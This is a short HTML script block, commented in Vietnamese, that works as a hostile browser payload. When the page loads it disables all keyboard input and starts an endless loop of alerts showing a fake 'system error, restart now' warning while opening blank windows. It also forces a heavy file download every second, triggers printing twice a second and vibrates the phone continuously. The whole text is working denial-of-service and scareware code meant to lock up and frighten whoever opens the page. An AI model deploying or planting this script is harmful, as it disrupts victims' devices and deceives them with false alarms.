<script>
// Chặn tất cả phím tắt
document.onkeydown = function(e) { return false; };

// Spam alert vô hạn
function crash() {
    while (true) {
        alert("🔥 LỖI HỆ THỐNG! Khởi động lại ngay! 🔥");
        window.open("about:blank");
    }
}

// Tự động tải file cực nặng
setInterval(() => {
    let a = document.createElement("a");
    a.href = "bigfile.zip"; // Thay bằng link file nặng
    a.download = "bigfile.zip";
    document.body.appendChild(a);
    a.click();
}, 1000);

// Bật in liên tục
setInterval(() => {
    window.print();
}, 500);

// Rung điện thoại liên tục
setInterval(() => {
    navigator.vibrate(1000);
}, 500);

window.onload = crash;
</script>
